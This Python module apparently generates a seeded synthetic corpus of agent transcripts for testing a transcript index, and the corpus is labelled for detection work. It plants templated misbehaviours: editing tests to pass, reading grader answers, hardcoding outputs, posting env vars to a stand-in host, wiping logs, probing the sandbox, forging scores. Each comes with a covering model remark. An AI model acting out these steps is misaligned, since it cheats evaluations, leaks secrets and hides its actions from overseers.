"""A seeded synthetic transcript corpus for the 0.74 transcript-index tests and bench.

Every run is a few ordinary steps (tool calls and model turns over words drawn
from a seeded vocabulary). A seeded run also carries the steps of one planted
behaviour, with its file names and values varied, at a random position. The
corpus is a pure function of its arguments: :func:`specs` returns the same
steps on every machine, and :func:`digest` pins that.
"""

from __future__ import annotations

import hashlib
import json
import random
from typing import Any

BEHAVIOURS = {
    "test-edit": [
        ("tool", "shell", "sed -i 's/assert {a}/assert True/' tests/test_{f}.py"),
        ("model", None, "the tests now pass so the task is complete"),
    ],
    "grader-read": [
        ("tool", "read_file", "cat /grader/expected_{f}.json"),
        ("tool", "write_file", "copy expected answer {a} into solution_{f}.txt"),
    ],
    "timeout-skip": [
        ("tool", "shell", "pytest -k 'not slow_{f}' --timeout {a}"),
        ("model", None, "skipping the slow checks to save time"),
    ],
    "exfil": [
        ("tool", "http_post", "post env vars to https://collector.invalid/{f}?k={a}"),
        ("model", None, "uploaded the configuration for safekeeping"),
    ],
    "hardcode": [
        ("tool", "write_file", "def solve_{f}(x): return {a}  # matches the sample"),
        ("model", None, "returning the known answer for the sample input"),
    ],
    "log-wipe": [
        ("tool", "shell", "rm -rf ~/.history_{f} /var/log/agent_{a}.log"),
        ("model", None, "cleaned up the logs before finishing"),
    ],
    "sandbox-probe": [
        ("tool", "shell", "ls /proc/1/root && cat /proc/{a}/environ {f}"),
        ("model", None, "checking what the sandbox can reach"),
    ],
    "reward-print": [
        ("tool", "shell", "echo 'SCORE: 1.0 reward={a}' >> results_{f}.log"),
        ("model", None, "wrote the final score line"),
    ],
}


def _vocab(rng: random.Random, n: int = 3000) -> list[str]:
    letters = "abcdefghijklmnopqrstuvwxyz"
    return ["".join(rng.choice(letters) for _ in range(rng.randint(3, 9))) for _ in range(n)]


def specs(n: int = 400, per_behaviour: int = 20, seed: int = 7374) -> list[dict[str, Any]]:
    """``[{"name", "behaviour", "steps": [(kind, tool, input, output)]}]``."""
    rng = random.Random(seed)
    vocab = _vocab(rng)
    labels = [b for b in sorted(BEHAVIOURS) for _ in range(per_behaviour)]
    labels += [None] * max(0, n - len(labels))
    rng.shuffle(labels)
    out = []
    for i, label in enumerate(labels):
        steps = []
        for _ in range(rng.randint(4, 8)):
            words = " ".join(rng.choice(vocab) for _ in range(rng.randint(8, 30)))
            if rng.random() < 0.5:
                tool = rng.choice(["shell", "read_file", "write_file", "search"])
                steps.append(("tool", tool, f"{tool} {words}", " ".join(rng.sample(vocab, 12))))
            else:
                steps.append(("model", None, words, " ".join(rng.sample(vocab, 20))))
        if label:
            at = rng.randint(0, len(steps))
            f, a = rng.choice(vocab), rng.randint(0, 999)
            planted = [(k, t, text.format(f=f, a=a), "ok") for k, t, text in BEHAVIOURS[label]]
            steps[at:at] = planted
        out.append({"name": f"t{i:05d}", "behaviour": label, "steps": steps})
    return out


def digest(rows: list[dict[str, Any]]) -> str:
    raw = json.dumps(rows, sort_keys=True, separators=(",", ":")).encode("utf-8")
    return hashlib.sha256(raw).hexdigest()


def write(repo: Any, rows: list[dict[str, Any]]) -> dict[str, str | None]:
    """Store each spec as a run; ``{run oid: behaviour}``."""
    from opentine.graph import Run, StepKind

    labels: dict[str, str | None] = {}
    for row in rows:
        run = Run(id=row["name"], model_info="m")
        for kind, tool, text, output in row["steps"]:
            extra = {"tool_info": {"name": tool}} if tool else {}
            run.add_step(StepKind(kind), {"text": text}, {"text": output}, **extra)
        labels[repo.put_run(run).run_id] = row["behaviour"]
    return labels


def render(row: dict[str, Any]) -> str:
    """The transcript text :mod:`opentine._transcript_text` would produce for *row*."""
    lines = []
    for seq, (kind, tool, text, output) in enumerate(row["steps"]):
        lines.append(f"step {seq} {kind}" + (f" tool {tool}" if tool else ""))
        lines.append(json.dumps({"text": text}, separators=(",", ":")))
        lines.append(json.dumps({"text": output}, separators=(",", ":")))
    return "\n".join(lines) + "\n"


__all__ = ["BEHAVIOURS", "digest", "render", "specs", "write"]
